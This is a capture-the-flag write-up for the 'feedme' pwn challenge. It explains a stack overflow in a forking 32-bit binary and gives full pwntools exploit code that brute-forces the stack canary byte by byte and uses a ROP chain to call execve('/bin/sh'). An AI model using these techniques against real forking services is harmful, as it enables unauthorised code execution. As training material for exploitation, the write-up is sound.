# FEEDME (pwn)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/bbd3eb0e-7fe5-427c-8b18-33f137a9848d)  

However, this challenge is a reminder that automated tools fail, and that you need to be able to verify things manually.  
I say this because we will realize that this program does have a stack canary.  


Running the program shows us the following.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1cf8e7af-488b-4768-90ba-bea0257d43f0)  
This quick glimpse into what the program does gives us some very important insights.
1. `*** stack smashing detected ***` --> this program has a stack canary
2.  Our program terminated... but it didn't. That, in combination with the `child exit` message indicates that this program is most likely forking.

To confirm our intuitions lets look at this program in ghidra.  

## Reversing
In order to find interesting functions quickly we can use gdb  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/86a5be7a-d853-465f-a6c4-85d16f2889f9)  
I `ctrl-c` when asked for input and then looked at the backtrace.  
Looking through those functions I found the following interesting function:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/41394d79-a1ef-48b9-be91-d424243028c4)  
I've reversed this function so you can look at it neatly in the decompiler view of ghidra.  

Some of the functions that are important are  
`getByte`:  
```c
  undefined byte;
  int local_10;
  
  local_10 = read(0,&byte,1);
  if (local_10 != 1) {
    func(0xffffffff);
  }
  return byte;
```

`scan()`:
```c
  int bytes_read;
  int i;
  int ctr;
  
  ctr = 0;
  for (i = bytes_to_read; i != 0; i = i - bytes_read) {
    bytes_read = read(0,buf + ctr,i);
    if (bytes_read < 1) {
      func(0xffffffff);
    }
    ctr = ctr + bytes_read;
  }
  return;
```

Notice that we read in the first byte of input, and then we scan in that many bytes into our buffer.  
However, our buffer is only 32 bytes, so we have a buffer overflow.  

We have now spotted the vulnerability, but there is still a stack canary we have to deal with, and also we have seen no mention of forking here.  
If we keep going down the backtrace we find this other interesting function  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1a89386f-838e-4e8a-9c48-6836266ff990)  

We can see that there is a loop running 800 times, and each of the times we fork, and then the child calls the vulnerable `input_function()`. That explains why our program was not terminated when we smashed the canary.  
The child was killed, but then the parent program forked again and we received another child.

## Exploitation

### Dealing with the stack canary
The problem with forking programs and stack canaries, is that the child process is an exact copy of the parent process, including the stack canary.  
That means that every child will have the same stack canary.  
We can then partially overwrite the stack canary and use the children crashing (or not) as an oracle to determine if we guessed correctly.  
This way we can bruteforce one byte at a time. Since the last byte is always `\x00`, we only need to guess 3 bytes which have 256 possible values each. That means at max 768 guesses, which is just fine since the program forks 800 times.  

```python
def bruteforce_canary(io = io):
    canary = [b'\x00']
    input_len = 0x22
    while len(canary) != 4:
        for byte in range(256):
            io.send(input_len.to_bytes(1,'little'))
            
            payload = b'A'*0x20
            for b in canary:
                payload += b
            payload += byte.to_bytes(1,'little')
            io.send(payload)

            response = io.recvuntil(b'exit.')

            if(b'YUM' in response):
                log.success("found byte: " + hex(byte))
                canary.append(byte.to_bytes(1,'little'))
                input_len += 1
                break
    _ = b''
    for b in canary:
        _ += b 
    canary = int.from_bytes(_,'little') 
    return canary
```

That funciton will bruteforce the canary.

### Setting up the ropchain
This is almost the same as [simplecalc](./bkp16_simplecalc.md) or [speedrun](./dcquals19_speedrun1.md).  
We will ROP to call execve.  
The only difference is that since registers can only fit 4 characters at a time, we need to write `/bin/sh` to memory in two steps.  
Also in `x86` syscalls are triggered by `int 0x80`.  

```python

#ropchain
payload += p32(pop_eax) + p32(binsh1) #load /bin to eax
payload += p32(pop_edx) + p32(write_addr) #load address to write to
payload += p32(mov_dword_edx_eax) #write /bin to memory

payload += p32(pop_eax) + p32(binsh2) #load /sh to eax
payload += p32(pop_edx) + p32(write_addr+0x4) #load address to write to
payload += p32(mov_dword_edx_eax) #write /sh to memory

payload += p32(pop_eax) + p32(11) #load execve syscall number to eax
payload += p32(pop_ecx_ebx) + p32(0) + p32(write_addr) #load 0 to ecx and pointer to /bin/sh to ebx
payload += p32(pop_edx) + p32(0)
payload += p32(syscall)
```

### Putting it all together
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template feedme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'feedme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
set follow-fork-mode child
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()


def bruteforce_canary(io = io):
    canary = [b'\x00']
    input_len = 0x22
    while len(canary) != 4:
        for byte in range(256):
            io.send(input_len.to_bytes(1,'little'))
            
            payload = b'A'*0x20
            for b in canary:
                payload += b
            payload += byte.to_bytes(1,'little')
            io.send(payload)

            response = io.recvuntil(b'exit.')

            if(b'YUM' in response):
                log.success("found byte: " + hex(byte))
                canary.append(byte.to_bytes(1,'little'))
                input_len += 1
                break
    _ = b''
    for b in canary:
        _ += b 
    canary = int.from_bytes(_,'little') 
    return canary

canary = bruteforce_canary()
log.success(hex(canary))

# now we do the actual exploit

# execve expects the following
# eax = 11 (execve syscall number)
# ebx = ptr to filename (we will write /bin/sh to 0x80e9000)
# ecx = 0
# edx = 0

write_addr = 0x80e9000 # beginning of data section
binsh1 = int.from_bytes(b'/bin','little') #registers only fit 4 chars

binsh2 = int.from_bytes(b'/sh','little')

pop_eax = 0x080bb496 # pop eax; ret;
pop_edx = 0x0806f34a # pop edx; ret;
pop_ecx_ebx = 0x0806f371 # pop ecx; pop ebx; ret;
mov_dword_edx_eax = 0x0809a7ed # mov dword ptr [edx], eax; ret;
syscall = 0x08049761 # int 0x80;

#craft payload 
payload = 0x20*b'A' #pad until canary
payload += p32(canary)
payload += 0xc*b'B' #pad until return addr

#ropchain
payload += p32(pop_eax) + p32(binsh1) #load /bin to eax
payload += p32(pop_edx) + p32(write_addr) #load address to write to
payload += p32(mov_dword_edx_eax) #write /bin to memory

payload += p32(pop_eax) + p32(binsh2) #load /sh to eax
payload += p32(pop_edx) + p32(write_addr+0x4) #load address to write to
payload += p32(mov_dword_edx_eax) #write /sh to memory

payload += p32(pop_eax) + p32(11) #load execve syscall number to eax
payload += p32(pop_ecx_ebx) + p32(0) + p32(write_addr) #load 0 to ecx and pointer to /bin/sh to ebx
payload += p32(pop_edx) + p32(0)
payload += p32(syscall)

log.info("length of payload: "+hex(len(payload)))
io.send(b"\x78")
io.send(payload)

io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/e4d3eb5b-6cb7-41ea-9b2c-a772f4e4b8ba)



